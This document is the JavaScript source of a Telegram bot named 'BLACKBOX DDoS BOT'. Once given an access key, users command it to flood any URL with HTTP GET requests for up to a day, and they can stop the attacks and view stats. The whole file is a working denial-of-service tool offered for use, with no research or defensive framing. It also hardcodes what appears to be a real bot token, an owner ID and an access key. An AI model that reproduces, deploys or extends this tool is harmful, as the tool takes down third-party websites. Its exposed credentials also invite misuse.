import fetch from 'node-fetch'

// ===== CONFIG =====
const BOT_TOKEN = '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc'
const OWNER_ID = 6629230649
const ACCESS_KEY = '123RJhTtApALhaT'

// ===== STATE =====
const users = new Set([OWNER_ID])
const attacks = new Map()

// ===== HELPER FUNCTIONS =====
async function sendMessage(chatId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text: text,
        parse_mode: 'HTML'
      })
    })
  } catch(e) {}
}

function startAttack(target, seconds, chatId, attackId) {
  let requestCount = 0
  const startTime = Date.now()
  const endTime = startTime + (seconds * 1000)
  
  const worker = setInterval(async () => {
    if (Date.now() > endTime) {
      clearInterval(worker)
      attacks.delete(attackId)
      
      const duration = (Date.now() - startTime) / 1000
      await sendMessage(chatId,
        `✅ ATTACK FINISHED\n\n` +
        `ID: <code>${attackId}</code>\n` +
        `Target: ${target}\n` +
        `Duration: ${duration.toFixed(1)}s\n` +
        `Requests: ${requestCount}`
      )
      return
    }
    
    try {
      await fetch(target, { signal: AbortSignal.timeout(2000) })
      requestCount++
    } catch(e) {}
  }, 100)
  
  attacks.set(attackId, { worker, chatId, target, startTime })
}

// ===== COMMAND HANDLERS =====
async function handleCommand(chatId, text, userId) {
  const isOwner = userId === OWNER_ID
  const isUser = users.has(userId)
  
  if (text === '/start') {
    let response = `⚡ <b>BLACKBOX DDoS BOT</b>\n\n`
    response += `User ID: <code>${userId}</code>\n`
    response += `Status: ${isOwner ? '👑 OWNER' : isUser ? '✅ AUTHORIZED' : '🔒 LOCKED'}\n\n`
    
    response += `<b>MAIN COMMANDS:</b>\n`
    response += `• /menu - Show commands\n`
    response += `• /ping - Test response\n`
    response += `• /methods - Attack methods\n`
    
    if (isOwner || isUser) {
      response += `\n<b>ATTACK COMMANDS:</b>\n`
      response += `• /attack url seconds\n`
      response += `• /stop id\n`
      response += `• /mystats - Your stats\n`
    }
    
    if (!isOwner && !isUser) {
      response += `\n<b>ACCESS KEY:</b>\n<code>${ACCESS_KEY}</code>\n`
      response += `Use: <code>/key ${ACCESS_KEY}</code>`
    }
    
    await sendMessage(chatId, response)
  }
  
  else if (text === '/menu') {
    await handleCommand(chatId, '/start', userId)
  }
  
  else if (text === '/ping') {
    await sendMessage(chatId, '🏓 PONG')
  }
  
  else if (text === '/methods') {
    await sendMessage(chatId,
      `⚡ <b>ATTACK METHODS</b>\n\n` +
      `• HTTP Flood - GET requests\n` +
      `• Duration: 1-86400 seconds\n` +
      `• Auto-stop after time\n\n` +
      `<b>Examples:</b>\n` +
      `<code>/attack https://example.com 60</code>\n` +
      `<code>/attack https://target.com 300</code>`
    )
  }
  
  else if (text.startsWith('/key')) {
    if (isOwner) {
      await sendMessage(chatId, '👑 Owner tidak perlu key')
      return
    }
    
    const key = text.split(' ')[1]
    if (key === ACCESS_KEY) {
      users.add(userId)
      await sendMessage(chatId,
        `✅ <b>ACCESS GRANTED!</b>\n\n` +
        `User ID: <code>${userId}</code>\n` +
        `Status: AUTHORIZED\n\n` +
        `Now you can use /attack command`
      )
    } else {
      await sendMessage(chatId, '❌ Invalid key')
    }
  }
  
  else if (text.startsWith('/attack')) {
    if (!isOwner && !isUser) {
      await sendMessage(chatId, '❌ Not authorized\nUse /key first')
      return
    }
    
    const parts = text.split(' ')
    if (parts.length < 3) {
      await sendMessage(chatId, '❌ Format: /attack url seconds\nExample: /attack https://site.com 60')
      return
    }
    
    const url = parts[1]
    const seconds = parseInt(parts[2])
    
    if (!url.startsWith('http')) {
      await sendMessage(chatId, '❌ Invalid URL\nUse http:// or https://')
      return
    }
    
    if (seconds < 1 || seconds > 86400) {
      await sendMessage(chatId, '❌ Duration: 1-86400 seconds')
      return
    }
    
    const attackId = Math.random().toString(36).substring(2, 8).toUpperCase()
    
    await sendMessage(chatId,
      `🚀 <b>ATTACK LAUNCHED</b>\n\n` +
      `ID: <code>${attackId}</code>\n` +
      `Target: ${url}\n` +
      `Duration: ${seconds}s\n` +
      `User: <code>${userId}</code>\n\n` +
      `Stop: <code>/stop ${attackId}</code>`
    )
    
    startAttack(url, seconds, chatId, attackId)
  }
  
  else if (text.startsWith('/stop')) {
    const attackId = text.split(' ')[1]?.toUpperCase()
    
    if (!attackId) {
      await sendMessage(chatId, '❌ Format: /stop attack_id')
      return
    }
    
    const attack = attacks.get(attackId)
    if (!attack) {
      await sendMessage(chatId, '❌ Attack not found')
      return
    }
    
    if (attack.chatId !== chatId && !isOwner) {
      await sendMessage(chatId, '❌ You can only stop your own attacks')
      return
    }
    
    clearInterval(attack.worker)
    attacks.delete(attackId)
    
    const duration = (Date.now() - attack.startTime) / 1000
    await sendMessage(chatId,
      `🛑 <b>ATTACK STOPPED</b>\n\n` +
      `ID: <code>${attackId}</code>\n` +
      `Duration: ${duration.toFixed(1)}s\n` +
      `Target: ${attack.target}`
    )
  }
  
  else if (text === '/mystats') {
    if (!isOwner && !isUser) {
      await sendMessage(chatId, '❌ Not authorized')
      return
    }
    
    const userAttacks = Array.from(attacks.entries())
      .filter(([id, attack]) => attack.chatId === chatId)
    
    let stats = `📊 <b>YOUR STATS</b>\n`
    stats += `User ID: <code>${userId}</code>\n`
    stats += `Active Attacks: ${userAttacks.length}\n\n`
    
    if (userAttacks.length > 0) {
      stats += `<b>ACTIVE ATTACKS:</b>\n`
      userAttacks.forEach(([id, attack]) => {
        const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0)
        stats += `• <code>${id}</code> - ${attack.target} (${duration}s)\n`
      })
    }
    
    await sendMessage(chatId, stats)
  }
  
  else if (text === '/users' && isOwner) {
    const userList = Array.from(users).map(id => `• <code>${id}</code>`).join('\n')
    await sendMessage(chatId, `👥 <b>USERS (${users.size})</b>\n\n${userList}`)
  }
  
  else if (text.startsWith('/add') && isOwner) {
    const newId = parseInt(text.split(' ')[1])
    if (newId) {
      users.add(newId)
      await sendMessage(chatId, `✅ Added user <code>${newId}</code>`)
      await sendMessage(newId, '🎉 You have been added by owner!\nUse /start to begin')
    }
  }
  
  else {
    await sendMessage(chatId, '❌ Unknown command\nUse /start for menu')
  }
}

// ===== MAIN HANDLER =====
export default async function handler(req, res) {
  if (req.method === 'GET') {
    return res.json({
      status: 'BLACKBOX ACTIVE',
      owner: OWNER_ID,
      users: users.size,
      attacks: attacks.size,
      uptime: Math.floor(process.uptime())
    })
  }
  
  if (req.method === 'POST') {
    try {
      const update = req.body
      
      if (update.message) {
        const chatId = update.message.chat.id
        const text = update.message.text || ''
        const userId = update.message.from?.id
        
        if (userId) {
          await handleCommand(chatId, text, userId)
        }
      }
      
      return res.json({ ok: true })
    } catch (error) {
      return res.json({ ok: true })
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' })
}
